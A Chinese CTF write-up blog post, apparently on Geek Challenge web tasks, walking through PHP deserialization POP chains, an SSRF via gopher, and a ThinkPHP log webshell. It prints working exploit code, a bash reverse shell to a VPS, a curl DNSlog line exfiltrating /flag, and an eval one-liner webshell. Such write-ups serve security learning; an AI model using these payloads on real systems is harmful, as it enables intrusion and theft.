

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/00155.jpg">
  <link rel="icon" type="image/png" href="/img/00155.jpg">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#6b99a1">
  <meta name="description" content="BLOG">
  <meta name="author" content="">
  <meta name="keywords" content="">
  <title>Geekchallenge - 1__/\/のblog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->

  
<link rel="stylesheet" href="/css/mac.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="1__/\/のblog" type="application/atom+xml">
</head>


<body>
  <header style="height: 100vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>1__/\/</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/00210.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Geekchallenge">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-11-26 00:31" pubdate>
        2021年11月26日 凌晨
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      4.1k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      73
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
            <div class="scroll-down-bar">
              <i class="iconfont icon-arrowdown"></i>
            </div>
          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Geekchallenge</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：4 个月前
                
              </p>
            
            <div class="markdown-body">
              <h2 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h2><p>这道不是极客大挑战的，就写这里吧</p>
<div class="hljs"><pre><code class="hljs php">&lt;html&gt;
&lt;!--<span class="hljs-keyword">if</span>($_REQUEST[<span class="hljs-string">&#x27;mode&#x27;</span>]!=<span class="hljs-string">&quot;begin&quot;</span>)&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Welcome PHP Games!&quot;</span>);
&#125;--&gt;
&lt;/html&gt;
<span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;

<span class="hljs-keyword">if</span>($_REQUEST[<span class="hljs-string">&#x27;mode&#x27;</span>]!=<span class="hljs-string">&quot;begin&quot;</span>)&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PHP Games!&quot;</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
    show_source(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">last_task</span></span>&#123;
        <span class="hljs-keyword">var</span> $left;
        <span class="hljs-keyword">var</span> $middle;
        <span class="hljs-keyword">var</span> $right;
    &#125;
    $a=$_GET[<span class="hljs-string">&#x27;a&#x27;</span>];
    $b=$_GET[<span class="hljs-string">&#x27;b&#x27;</span>];
    <span class="hljs-keyword">if</span>($a==$b)&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong way&quot;</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">if</span>(md5($a)!==md5($b))&#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;need a little magic&quot;</span>);
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;token&#x27;</span>])&#123;
                $token = unserialize($_POST[<span class="hljs-string">&#x27;token&#x27;</span>]);
                <span class="hljs-keyword">if</span>($token[<span class="hljs-string">&#x27;user&#x27;</span>]==<span class="hljs-string">&quot;user&quot;</span>&amp;&amp;$token[<span class="hljs-string">&#x27;pass&#x27;</span>]==<span class="hljs-string">&quot;pass&quot;</span>)&#123;
                        $flag=$_POST[<span class="hljs-string">&#x27;flag&#x27;</span>];
                        <span class="hljs-keyword">if</span>($flag)&#123;
                            $flag = unserialize(urldecode($flag));
                            $flag-&gt;middle = $fl4g;
                            <span class="hljs-keyword">if</span>($flag-&gt;middle===$flag-&gt;left&amp;&amp;$flag-&gt;middle===$flag-&gt;right)&#123;
                                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is your flag &quot;</span>.$flag-&gt;middle;
                            &#125;<span class="hljs-keyword">else</span>&#123;
                                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;one more step&quot;</span>);
                            &#125;
                        &#125;<span class="hljs-keyword">else</span>&#123;
                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;don&#x27;t give up&quot;</span>);
                        &#125;
                &#125;<span class="hljs-keyword">else</span>&#123;
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not a valid token&quot;</span>);
                &#125;
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;give me the token&quot;</span>);
            &#125;
        &#125;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>


<p>主要是最后一关<br>exp:</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">last_task</span></span>&#123;
    <span class="hljs-keyword">var</span> $left;
    <span class="hljs-keyword">var</span> $middle;
    <span class="hljs-keyword">var</span> $right;
&#125;
$a=<span class="hljs-keyword">new</span> last_task();
$a-&gt;left=&amp;$a-&gt;middle;
$a-&gt;right=&amp;$a-&gt;left;
<span class="hljs-keyword">echo</span> serialize($a);
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p>取地址<code>&amp;</code>符号可太行了，我怎么想不到呢。。。。。。。。</p>
<h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $Do_u_like_JiaRan = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $Do_u_like_AFKL = <span class="hljs-literal">false</span>;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;
    <span class="hljs-keyword">private</span> $i_want_2_listen_2_MaoZhongDu;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span> (a::$Do_u_like_AFKL) &#123;
            <span class="hljs-keyword">return</span> exec(<span class="hljs-keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu);
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);
        &#125;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        a::$Do_u_like_JiaRan = <span class="hljs-literal">true</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        a::$Do_u_like_AFKL = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;关注嘉然,&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;value;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">e</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span> (a::$Do_u_like_JiaRan) &#123;
            (<span class="hljs-keyword">$this</span>-&gt;afkl)();
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);
        &#125;
    &#125;
&#125;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;
    unserialize(base64_decode($_GET[<span class="hljs-string">&#x27;data&#x27;</span>]));
&#125; <span class="hljs-keyword">else</span> &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;</code></pre></div>
<p>一道反序列化，值得注意的是，static变量不能被反序列化<br>所以在写exp时就不能带<code>class a</code>了</p>
<p>exp:</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;
    <span class="hljs-keyword">private</span> $i_want_2_listen_2_MaoZhongDu;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu=$a;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        $Do_u_like_JiaRan = <span class="hljs-literal">true</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;
    <span class="hljs-comment">//$this.value=new b();</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        $Do_u_like_AFKL = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;关注嘉然,&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;value;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">e</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span> ($Do_u_like_JiaRan) &#123;
            (<span class="hljs-keyword">$this</span>-&gt;afkl)();
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);
        &#125;
    &#125;
&#125;

$b = <span class="hljs-keyword">new</span> b(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/[vps-ip]/9999 0&gt;&amp;1&quot;&#x27;</span>);
$c = <span class="hljs-keyword">new</span> c();
$d = <span class="hljs-keyword">new</span> d();
$d-&gt;value = $b;
$e = <span class="hljs-keyword">new</span> e();
$e-&gt;afkl = $d;


<span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize([$c,$e]))).<span class="hljs-string">&quot;\n&quot;</span>;</code></pre></div>
<p>最后将c和e作为一个数组进行序列化，也就是这里是两个入口，以前做的反序列化都是找一个入口，然后一步一步推，原来还可以两个一起，属实是学废了</p>
<p>还有就是关于反弹shell，我一开始弹，端口在阿里云也开了，就是弹不出来，甚至怀疑自己买了假的服务器，之后突然想到服务器上安了宝塔，看了一眼，果然，宝塔的防火墙端口没开，打开就弹出来了，wssb</p>
<p>dnslog带出<code>curl `cat /flag|base64`.xxxxxx.dnslog.cn</code></p>
<h2 id="期末不挂科就算成功"><a href="#期末不挂科就算成功" class="headerlink" title="期末不挂科就算成功"></a>期末不挂科就算成功</h2><p><img src="https://s3.bmp.ovh/imgs/2021/11/a087dd443ee23e03.png" srcset="/img/loading.gif"><br>注释中发现<code>/debug.php</code><br>进入后是用文件包含，伪协议读取下<code>index.php</code><br>额外信息：</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&#x27;url&#x27;</span>]);
<span class="hljs-comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);
<span class="hljs-comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
curl_exec($ch);
curl_close($ch);
<span class="hljs-comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p>在<code>172.17.0.7</code>中除了先前有的还出现了一张图片，应该就是这里了，然后就不会了。<br>看WP要<code>gopher</code>协议<code>post</code></p>
<div class="hljs"><pre><code>POST /index.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

name=admin&amp;password=123456&amp;result=60</code></pre></div>
<p>进行两次url编码，然后开头加上<code>gopher://172.17.0.7:80/_</code></p>
<p>值得注意的是，直接两次url编码每行的末尾是<code>%250a</code>也就是只有一个换行符，改成<code>%250D%250A</code>-换行回车</p>
<p>payload：<code>http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Aname%253Dadmin%2526password%253D123456%2526result%253D60%250d%250A</code></p>
<h2 id="成全"><a href="#成全" class="headerlink" title="成全"></a>成全</h2><p><code>ThinkPHP v5.0.12</code><br>报错出现了<code>debug</code>界面<br><img src="https://s3.bmp.ovh/imgs/2021/11/24dded7c8682ffb6.png" srcset="/img/loading.gif"></p>
<p>tp的默认日志文件形式为<code>/202110/11.log</code>文件夹为年加月，文件为日</p>
<p>对月(1-12)和天(1-31)进行交集爆破<br><img src="https://s3.bmp.ovh/imgs/2021/11/c912d29924a29513.png" srcset="/img/loading.gif"><br>结果<br><img src="https://s3.bmp.ovh/imgs/2021/11/d23301543298d305.png" srcset="/img/loading.gif"><br>在第一个日志中有写好的一句话</p>
<div class="hljs"><pre><code>&lt;?php eval($_POST[&#39;Syccccc&#39;]);
phpinfo(); ?&gt;</code></pre></div>
<p>然后通过shell读取flag</p>
<h2 id="easyPOP"><a href="#easyPOP" class="headerlink" title="easyPOP"></a>easyPOP</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;test-&gt;test();
    &#125;
&#125;

<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;
    <span class="hljs-keyword">private</span> $b = <span class="hljs-number">1</span>;

    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>)</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) </span>&#123;
        (<span class="hljs-keyword">$this</span>-&gt;b)();
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">b</span> </span>&#123;
    <span class="hljs-keyword">private</span> $call;
    <span class="hljs-keyword">protected</span> $value;

    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-keyword">$this</span>-&gt;value)) &#123;
            (<span class="hljs-keyword">$this</span>-&gt;call)(<span class="hljs-keyword">$this</span>-&gt;value);
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can&#x27;t do this :(&quot;</span>);
        &#125;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;
    <span class="hljs-keyword">public</span> $value;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params">$call</span>) </span>&#123;
        $call(<span class="hljs-keyword">$this</span>-&gt;value);
    &#125;
&#125;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;
    unserialize(base64_decode($_GET[<span class="hljs-string">&#x27;data&#x27;</span>]));
&#125; <span class="hljs-keyword">else</span> &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;</code></pre></div>


<p>exp:</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $test;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;test = $a;
    &#125;
&#125;
<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">private</span> $b = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;b = $a;
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">b</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">private</span> $call;
    <span class="hljs-keyword">protected</span> $value;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a, $b</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;call = $a;
        <span class="hljs-keyword">$this</span>-&gt;value = $b;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setB</span>(<span class="hljs-params">$c</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-built_in">parent</span>::__construct($c);
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $value;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;value = $a;
    &#125;
&#125;
$c = <span class="hljs-keyword">new</span> c(
    [<span class="hljs-keyword">new</span> d(<span class="hljs-string">&quot;system&quot;</span>), <span class="hljs-string">&quot;eval&quot;</span>],
    [<span class="hljs-keyword">new</span> d(<span class="hljs-string">&quot;whoami&quot;</span>), <span class="hljs-string">&quot;eval&quot;</span>],
);
$c-&gt;setB([$c, <span class="hljs-string">&quot;eval&quot;</span>]);
$exp = <span class="hljs-keyword">new</span> a($c);
<span class="hljs-keyword">echo</span> base64_encode(serialize($exp));</code></pre></div>


<p>执行流程：</p>
<div class="hljs"><pre><code>class a的test=new c(),调用c的test(),c继承于b,
会先调d的test(),而b中的$b被设为[$c, &quot;eval&quot;],
然后就会调用c的eval()函数，而$this-&gt;call=[new d(&quot;system&quot;), &quot;eval&quot;],
$this-&gt;value=[new d(&quot;whoami&quot;), &quot;eval&quot;],然后($this-&gt;call)($this-&gt;value)
就变成了([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;]);
第一次进入到d中，d的$this-&gt;value=system,$call=[new d(&quot;whoami&quot;), &quot;eval&quot;];
$call($this-&gt;value)就成了[new d(&quot;whoami&quot;), &quot;eval&quot;] (&quot;system&quot;)
第二次进入d中,d的$this-&gt;value=whoami,$call=system,
$call($this-&gt;value)就成了(&quot;system&quot;)(&quot;whoami&quot;)</code></pre></div>
<p>关于为啥<code>[$c, &quot;eval&quot;]</code>就能执行<code>c</code>的<code>eval</code>函数</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123&quot;</span>;
    &#125;
&#125;
$dd=[<span class="hljs-keyword">new</span> aa(),<span class="hljs-string">&quot;fun&quot;</span>]();     <span class="hljs-comment">//输出 123      [&quot;aa&quot;,&quot;fun&quot;]()这样也可以</span></code></pre></div>
<p>还有就是<code>([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;])</code>这个，后面的<code>[new d(&quot;whoami&quot;), &quot;eval&quot;]</code>被当作eval的参数传进去了</p>
<p>看一个简单的</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;
    <span class="hljs-keyword">public</span> $c1;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$qq</span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;c1=$qq;

    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bb</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params">$aadd</span>)</span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;34&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;
        var_dump($aadd);
    &#125;
&#125;
$b=<span class="hljs-keyword">new</span> aa([<span class="hljs-keyword">new</span> bb(),<span class="hljs-string">&quot;fun&quot;</span>]([<span class="hljs-string">&quot;123&quot;</span>]));</code></pre></div>
<p>输出</p>
<div class="hljs"><pre><code>34
array(1) &#123;
[0]=&gt;
string(3) &quot;123&quot;
&#125;</code></pre></div>
<p>所以在一个数组中，<code>[new a(),&quot;fff&quot;]()</code>就相当于<code>new a()-&gt;ff()</code>,当然，后面的<code>()</code>里也可以加参数，如果需要的话</p>
<p><code>php是世界上最好的语言✔（￣︶￣）↗　</code></p>
<h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">chijou_kega_no_junnka</span>(<span class="hljs-params">$str</span>) </span>&#123;
    $black_list = [<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot; &quot;</span>];
    <span class="hljs-keyword">return</span> str_replace($black_list, <span class="hljs-string">&quot;&quot;</span>, $str);
&#125;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;DATA&#x27;</span>])) &#123;
    $data = $_GET[<span class="hljs-string">&#x27;DATA&#x27;</span>];
    $addr = chijou_kega_no_junnka($data[<span class="hljs-string">&#x27;ADDR&#x27;</span>]);
